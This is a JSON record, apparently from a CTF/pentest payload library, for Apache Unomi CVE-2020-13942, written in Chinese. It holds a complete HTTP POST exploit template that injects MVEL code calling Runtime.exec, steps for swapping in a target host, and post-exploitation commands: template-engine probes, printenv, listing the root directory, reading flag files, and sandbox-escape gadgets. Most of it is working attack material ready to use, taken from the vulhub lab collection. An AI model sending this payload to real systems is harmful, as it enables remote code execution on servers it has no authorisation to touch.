{"id": "vulhub:unomi:cve-2020-13942", "kind": "poc", "title": "Apache Unomi 表达式注入远程代码执行漏洞（CVE-2020-13942）", "technique": "ssti", "summary": "unomi / CVE-2020-13942。载荷取自上流 README 的复现段落，已按实例值参数化。", "preconditions": ["目标产品为 unomi，且版本落在 CVE-2020-13942 的影响范围内（先确认版本，再发载荷）", "README 中的服务端口需按实际目标替换"], "target_stack": ["unomi", "CVE-2020-13942"], "payload_template": "POST /context.json HTTP/1.1\nHost: {{host}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: application/json\nContent-Length: 483\n\n{\n    \"filters\": [\n        {\n            \"id\": \"sample\",\n            \"filters\": [\n                {\n                    \"condition\": {\n                         \"parameterValues\": {\n                            \"\": \"script::Runtime r = Runtime.getRuntime(); r.exec(\\\"touch /tmp/mvel\\\");\"\n                        },\n                        \"type\": \"profilePropertyCondition\"\n                    }\n                }\n            ]\n        }\n    ],\n    \"sessionId\": \"sample\"\n}", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错、状态码或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认 unomi 版本在 CVE-2020-13942 影响范围内", "把 payload 中的 {{target_url}} / {{host}} 换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先确认模板引擎与沙箱：`{{7*7}}`、`${7*7}`、`#{7*7}` 三选一定引擎，再找对应 RCE gadget。", "有 RCE 就走 `printenv` → `ls -la /` → `cat /flag*`，与普通命令执行相同。", "沙箱拦了就先读全局对象/配置（Java 的 `freemarker.template.utility.Execute`、Python 的 `__subclasses__`）再执行。"], "provenance": {"source_type": "reference-corpus", "source_ref": "vulhub", "source_url": "https://github.com/vulhub/vulhub/tree/master/unomi/CVE-2020-13942", "notes": "提取自 unomi/CVE-2020-13942/README.zh-cn.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
